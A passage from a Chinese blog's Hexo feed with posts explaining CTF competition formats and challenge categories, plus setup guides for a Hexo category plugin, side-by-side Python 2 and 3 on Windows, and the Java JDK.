        <content type="html"><![CDATA[<h1 id="竞赛模式"><a href="#竞赛模式" class="headerlink" title="竞赛模式"></a>竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><p><strong>理论题多见于国内比赛，通常为选择题。</strong>包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常<strong>多见于初赛或是初赛之前的海选</strong></p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。</p><p>不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p><p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code></p><p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h2><p><strong>A</strong> ttack <strong>w</strong> ith <strong>D</strong> efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。</p><p>AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="AWP-攻防增强"><a href="#AWP-攻防增强" class="headerlink" title="AWP-攻防增强"></a>AWP-攻防增强</h2><p><strong>A</strong> ttack <strong>D</strong> efense <strong>P</strong> lus(ADP)全称攻防增强模式，在该模式下中，参赛队伍连接到同一个网络空间。主办方会在平台上放置题目，选手需要登录到平台获得题目信息</p><p>攻击模式下，平台会给出题目的访问链接，选手按照解题模式做题提交flag即可完成攻击，当完成攻击后， 每轮计算分数时均会计算该题目的攻击得分。</p><p>防御模式下，选手需要自行挖掘题目的漏洞，并制作漏洞补丁包上传至平台，之后点击验证。验证时平台会新建一个完全干净的题目环境，使用预置的Exploit进行攻击，若攻击成功当验证通过之后（即已经完成修补），每轮计算分数均会认为该题目已防御。</p><p>也就是说，对于每个题目，仅需要攻击成功一次，防御成功一次，该题就可以认为已完成，后续无需进行关注。</p><p>ADP通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。随着比赛的进行，最早的题目可能会下线，后续也有可能会上线新的题目。</p><p>ADP相较于AwD来说，选手无须编写批量攻击脚本，也无需关注题目的环境是否被攻击，是否服务异常等等，要做的只是攻击一次，防御一次，选手可以有更多的时间聚焦于还未完成的题目。从主办方的角度来说，大大减轻了比赛的硬件成本和运维成本。</p><h2 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[ AI自动化]"></a>RHG-自动化[ AI自动化]</h2><p><strong>R</strong> obo <strong>H</strong> acking <strong>G</strong> ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。</p><p>比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p><strong>R</strong> eal <strong>W</strong> orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率</p><p>举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p><strong>K</strong> ing <strong>o</strong> f <strong>H</strong> ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h2><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>国内前三种模式比较常见</strong></p><p><strong>理论知识，解题模式，攻防模式</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1%E3%80%81CTF%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1%E3%80%81CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF简介"><a href="#CTF简介" class="headerlink" title="CTF简介"></a>CTF简介</h1><p>CTF（<strong>C</strong> apture <strong>T</strong> he <strong>F</strong> lag，夺旗赛）CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有<code>一定格式的字符串</code>或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为<strong>“Flag”。</strong></p><p>flag所表示的为目标服务器上存储的一些<code>敏感机密</code>的信息, 这些信息正常情况下是不能对外暴露的。选手利用目标的一些漏洞，获取到flag，其表示的即为在真实的黑客攻击中窃取到的机密信息。</p><p>一般情况下flag拥有固定格式为<code>flag&#123;xxxxx&#125;</code>，有些比赛会把flag关键词替换，例如CTFHub平台的flag为<code>ctfhub&#123;xxxxx&#125;</code>，利用固定格式来反推flag也是一种常见的解题思路</p><p>通常来说CTF是以团队为单位进行参赛。每个团队3-5人(具体根据主办方要求决定)，在整个比赛过程中<strong>既要每个选手拥有某个方向的漏洞挖掘能力</strong>，也要同队选手之间的<strong>相互配合</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目类型</title>
      <link href="/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E3%80%81%E9%A2%98%E7%9B%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E3%80%81%E9%A2%98%E7%9B%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h1><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</p><p>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志的自动分类插件 hexo-auto-category</title>
      <link href="/2021/12/27/Hexo/%E6%97%A5%E5%BF%97%E7%9A%84%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%E6%8F%92%E4%BB%B6-hexo-auto-category/"/>
      <url>/2021/12/27/Hexo/%E6%97%A5%E5%BF%97%E7%9A%84%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%E6%8F%92%E4%BB%B6-hexo-auto-category/</url>
      
        <content type="html"><![CDATA[<h1 id="日志的自动分类插件-hexo-auto-category"><a href="#日志的自动分类插件-hexo-auto-category" class="headerlink" title="日志的自动分类插件 hexo-auto-category"></a>日志的自动分类插件 hexo-auto-category</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hexo写日志，通常我们都需要维护一个front-matter信息，包括<code>title</code>、<code>date</code>。博客多了，为了方便日志分类，一般还需要设置<code>categories</code>。<br>比如下面的例子：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: Hexo简介</span><br><span class="line">date: 2008-08-08</span><br><span class="line">categories:</span><br><span class="line">  - web开发</span><br><span class="line">  - 前端</span><br><span class="line">  - 博客框架</span><br></pre></td></tr></table></figure><p>久而久之，就会发现很多问题：</p><ul><li><strong>工作繁琐</strong>：大量的category是重复性工作</li><li><strong>容易出错</strong>：大小写和中英文目录有可能混杂。比如有个<code>web</code>目录，偶尔我们写成了<code>Web</code>，造成了目录树中冗余的节点。</li><li><strong>可维护性差</strong>：如果要更改<code>目录树</code>中的节点，就要手动更改每个日志的<code>categories</code>变量。</li></ul><p>本文介绍一种<strong>自动生成categories</strong>的插件 <a href="https://github.com/xu-song/hexo-auto-category">hexo-auto-category官方地址</a>。</p><h1 id="自动生成-categories"><a href="#自动生成-categories" class="headerlink" title="自动生成 categories"></a>自动生成 <code>categories</code></h1><p>最常用的文件管理策略，就是利用文件系统目录结构(树形结构 directory-tree)。<br>同样，为了便于管理大量的日志文件，采用目录结构是一种简便可行的方案。<code>hexo-auto-category</code>根据日志文件(Markdown)所在文件目录自动分类，即自动生成<code>markdown</code>的front-matter中的<code>categories</code>变量。</p><p><strong>示例</strong></p><p>对于博客  <code>source/_post/web/framework/hexo.md</code>，该插件会自动生成以下<code>categories</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - web</span><br><span class="line">  - framework</span><br></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-auto-category --save</span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>在站点根目录下的<code>_config.yml</code>添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Generate categories from directory-tree</span><br><span class="line"># Dependencies: https://github.com/xu-song/hexo-auto-category</span><br><span class="line"># depth: the depth of directory-tree you want to generate, should &gt; 0</span><br><span class="line">auto_category:</span><br><span class="line"> enable: true</span><br><span class="line"> depth:</span><br></pre></td></tr></table></figure><h1 id="编译-amp-部署"><a href="#编译-amp-部署" class="headerlink" title="编译 &amp; 部署"></a>编译 &amp; 部署</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><h1 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h1><p>如果只想生成第一级目录分类，可以设置<code>depth</code>属性，比如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto_category:</span><br><span class="line"> <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"> depth: 1</span><br></pre></td></tr></table></figure><p>如有任何疑问，可在<a href="https://github.com/xu-song/hexo-auto-category/issues">Github Issue</a>提出</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10下python3和python2同时安装并解决pip共存问题</title>
      <link href="/2021/12/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Win10%E4%B8%8Bpython3%E5%92%8Cpython2%E5%90%8C%E6%97%B6%E5%AE%89%E8%A3%85%E5%B9%B6%E8%A7%A3%E5%86%B3pip%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
      <url>/2021/12/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Win10%E4%B8%8Bpython3%E5%92%8Cpython2%E5%90%8C%E6%97%B6%E5%AE%89%E8%A3%85%E5%B9%B6%E8%A7%A3%E5%86%B3pip%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="Win10下python3和python2同时安装并解决pip共存问题"><a href="#Win10下python3和python2同时安装并解决pip共存问题" class="headerlink" title="Win10下python3和python2同时安装并解决pip共存问题"></a>Win10下python3和python2同时安装并解决pip共存问题</h1><p><strong>特别说明</strong>，本文是在<strong>Windows64位系统</strong>下进行的，32位系统请下载相应版本的安装包，安装方法类似。</p><p>使用python开发，环境有Python2和 python3 两种，有时候需要两种环境切换使用，下面提供详细教程一份。</p><h2 id="1、下载python3和python2"><a href="#1、下载python3和python2" class="headerlink" title="1、下载python3和python2"></a><strong>1、下载python3和python2</strong></h2><p>进入python官网，链接<a href="https://link.jianshu.com/?t=https://www.python.org/">https://www.python.org/</a></p><p>选择Downloads—&gt;Windows，点击进入就可以看到寻找想要的python版本</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-de82357bbba2ad6a" alt="img"></p><p>本文选择的是：</p><p>Python3.5.2,点击后面链接可直接下载，<a href="https://link.jianshu.com/?t=https://www.python.org/ftp/python/3.5.2/python-3.5.2rc1-amd64.exe">https://www.python.org/ftp/python/3.5.2/python-3.5.2rc1-amd64.exe</a></p><p>Python2.7.9, 点击后面链接可直接下载，<a href="https://link.jianshu.com/?t=https://www.python.org/ftp/python/2.7.9/python-2.7.9.amd64.msi">https://www.python.org/ftp/python/2.7.9/python-2.7.9.amd64.msi</a></p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-41d9c51fce8d0cf5" alt="img"></p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-3ec402f13d0f8913" alt="img"></p><h2 id="2、python3安装"><a href="#2、python3安装" class="headerlink" title="2、python3安装"></a><strong>2、python3安装</strong></h2><p><strong>说明：</strong>本文先安装python3，然后安装python2</p><p>首先选择安装目录，本文安装路径为D:\Python\python35，然后点击下载好的python3软件包进行安装，具体流程如下：</p><p>在下图红色标记的地方Add Python3.5 to PATH前勾选，可以直接将python3添加到系统环境变量，然后在Customize installation中自定义安装路径。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-1d289078b74a795c" alt="img"></p><p>直接next即可</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-d22ecf73cae68300" alt="img"></p><p>下图中Advanced Options中没有默认勾选的根据自己的需要进行勾选，黄色标记为VS 2015及其以后版本需要的，如果你以后打算在VS 2015中配置python环境请勾选此项，点击Browse选择安装目录，然后点击Install进行安装。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-2bc0d4a03f040fa5" alt="img"></p><p>等待如下安装过程</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-e04dcb6ee0cffae8" alt="img"></p><p>安装成功</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-eddb404f2dc2b6a9" alt="img"></p><p>点击关闭，查看python3安装情况，按“Win +  R”快捷键，在打开的“运行”对话框中，输入“cmd”按回车，进入如下界面，输入python查看python3安装情况，显示python  3.5.2 的版本信息，则安装成功，可以输入语句print(1 + 1)进行测试。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-b1da48b9e7669877" alt="img"></p><h2 id="3、python2安装"><a href="#3、python2安装" class="headerlink" title="3、python2安装"></a><strong>3、python2安装</strong></h2><p>点击python2安装包，点击运行，next，选择安装目录，本文安装路径为D:\Python\python27，然后next</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-62b0fedd18e80c74" alt="img"></p><p>下图黄色圈出的部分，显示不能够添加路径到系统变量，不能够直接使用python命令没有关系，先点击next进行安装，后面专门解决。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-2f886478a13581ae" alt="img"></p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-31615841f1bbb5fa" alt="img"></p><p>点击finish完成安装。</p><p>至此，python2和python3安装完毕。</p><p><strong>特别说明：此时运行“cmd”命令进入DOS命令提示框，输入python仍然显示python3版本，接下来请参考本系列教程二。</strong></p><h2 id="4、添加python2到系统环境变量"><a href="#4、添加python2到系统环境变量" class="headerlink" title="4、添加python2到系统环境变量"></a><strong>4、添加python2到系统环境变量</strong></h2><p>打开，控制面板\系统和安全\系统，选择高级系统设置，环境变量，选择Path，点击编辑，新建，分别添加D:\Python\python27和D:\Python\python27\Scripts到环境变量。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211203224731212.png" alt="image-20211203224731212"></p><p><strong>注意：</strong>python3安装时可以选择自动添加到系统环境变量，如未选择，方法和python2添加过程相同。</p><h2 id="5、修改python-exe名字为python2-exe和python3-exe"><a href="#5、修改python-exe名字为python2-exe和python3-exe" class="headerlink" title="5、修改python.exe名字为python2.exe和python3.exe"></a><strong>5、修改python.exe名字为python2.exe和python3.exe</strong></h2><p>找到python2和python3的安装目录，修改python2.7.9和python3.5.2中python.exe和pythonw.exe的名称为python2.exe、pythonw2.exe和python3.exe、pythonw3.exe。</p><p>然后在运行cmd命令，输入python2即可运行python2.7.9版本</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-794c9229971e7428" alt="img"></p><p>输入python3即可运行python3.5.2版本</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-24d49a00b8330d6a" alt="img"></p><p>至此，python2和python3 安装完毕。</p><h2 id="6、pip2-和-pip3设置"><a href="#6、pip2-和-pip3设置" class="headerlink" title="6、pip2 和 pip3设置"></a><strong>6、pip2 和 pip3设置</strong></h2><p>Python 安装包需要用到包管理工具pip，但是当同时安装python2和python3的时候，pip只是其中一个版本，以下将提供一个修改方式，即重新安装两个版本的pip，使得两个python版本的pip能够共存。</p><p>在DOS命令框输入命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p>显示重新安装成功。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-054a7aa96cfeb593" alt="img"></p><p>在DOS命令框输入命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p>显示重新安装成功。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/5988523-2a6cb492ae23168c" alt="img"></p><p>现在可以通过pip2 -V 和 pip3 -V 查看两个版本的pip信息，以后只需运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install XXX和pip3 install XXX</span><br></pre></td></tr></table></figure><p>即可安装各自的python包。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211203224550722.png" alt="image-20211203224550722"></p><p>至此，pip2和pip3 修改成功。</p><h2 id="7、在PyCharm中切换"><a href="#7、在PyCharm中切换" class="headerlink" title="7、在PyCharm中切换"></a><strong>7、在PyCharm中切换</strong></h2><p>如果你使用的是PyCharm编写Python，当需要切换Python版本时，只需要在设置中搜索“Project Interpreter”，然后进行切换即可，同时可以看到已经安装到该版本中的库。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java开发环境搭建</title>
      <link href="/2021/12/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/12/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Java开发环境搭建"><a href="#Java开发环境搭建" class="headerlink" title="Java开发环境搭建"></a>Java开发环境搭建</h1><p>这里只介绍<code>window</code>环境下的<code>Jdk</code>安装配置、Linux以及Mac的后面补充</p><h2 id="1、Jdk简介"><a href="#1、Jdk简介" class="headerlink" title="1、Jdk简介"></a>1、Jdk简介</h2><blockquote><p>Jdk全称（java development kit）,及java标准开发包。</p><blockquote><p>JDK是 <a href="https://baike.baidu.com/item/Java/85979">Java</a> 语言的<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E5%8C%85/10418833">软件开发工具包</a>主要用于<a href="https://baike.baidu.com/item/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87/9157757">移动设备</a>、<a href="https://baike.baidu.com/item/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87/10055189">嵌入式设备</a>上的java应用程序。JDK是整个java开发的核心，它包含了JAVA的运行环境（JVM+Java系统类库）和JAVA工具。</p><blockquote><p>Jdk中包含了Jre(Java Runtime Envirnment)【java运行环境】、java工具和java开发所需的一些基础类库（及JavaApi 包括rt.jar）</p></blockquote></blockquote></blockquote><h2 id="2、Jdk下载"><a href="#2、Jdk下载" class="headerlink" title="2、Jdk下载"></a>2、Jdk下载</h2><p><a href="https://www.oracle.com/java/technologies/downloads/">官网</a></p><p>​        根据自己电脑的配置<code>32/64位</code>等选择版本下载。个人使用的jdk1.8_211版本，如果需要可以下载，下面是连接</p><p>链接：<a href="https://pan.baidu.com/s/16wOSHaTDmol25wVDLNgy6A">https://pan.baidu.com/s/16wOSHaTDmol25wVDLNgy6A</a><br> 提取码：fd8j</p><h2 id="3、jdk的安装"><a href="#3、jdk的安装" class="headerlink" title="3、jdk的安装"></a>3、jdk的安装</h2><p>​      双击下载好的exe软件，一路下一步默认安装、安装过程中也可以根据需要选择安装路径</p><h2 id="4、环境变量配置"><a href="#4、环境变量配置" class="headerlink" title="4、环境变量配置"></a>4、环境变量配置</h2><p><strong>右击此电脑&gt;属性&gt;高级系统设置&gt;环境变量</strong></p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201085153585.png" alt="image-20211201085153585"></p><h3 id="1、新建JAVA-HOME"><a href="#1、新建JAVA-HOME" class="headerlink" title="1、新建JAVA_HOME"></a>1、新建JAVA_HOME</h3><p><strong>系统变量中点击新建按钮</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：JAVA_HOME</span><br><span class="line">变量值：安装jdk的路径</span><br></pre></td></tr></table></figure><p>示范：</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201085651886.png" alt="image-20211201085651886"></p><h3 id="2、新建CLASSPATH"><a href="#2、新建CLASSPATH" class="headerlink" title="2、新建CLASSPATH"></a>2、新建CLASSPATH</h3><p><strong>系统变量中新建，注意前面的<code>.</code>不要忽略</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：CLASSPATH</span><br><span class="line">变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure><p>示范：</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201090328307.png" alt="image-20211201090328307"></p><h3 id="3、修改Path变量"><a href="#3、修改Path变量" class="headerlink" title="3、修改Path变量"></a>3、修改Path变量</h3><p><strong>找到path点击编辑&gt;新建两条</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%JAVA_HOME%\bin</span><br><span class="line">%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201090342556.png" alt="image-20211201090342556"></p><p><strong>所有配置完成后确认</strong></p><h3 id="4、测试是否成功"><a href="#4、测试是否成功" class="headerlink" title="4、测试是否成功"></a>4、测试是否成功</h3><p>打开命令提示符窗口、快捷键win+R输入cmd打开</p><p>输入java、java -version出现信息表示安装成功</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211203224300895.png" alt="image-20211203224300895"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
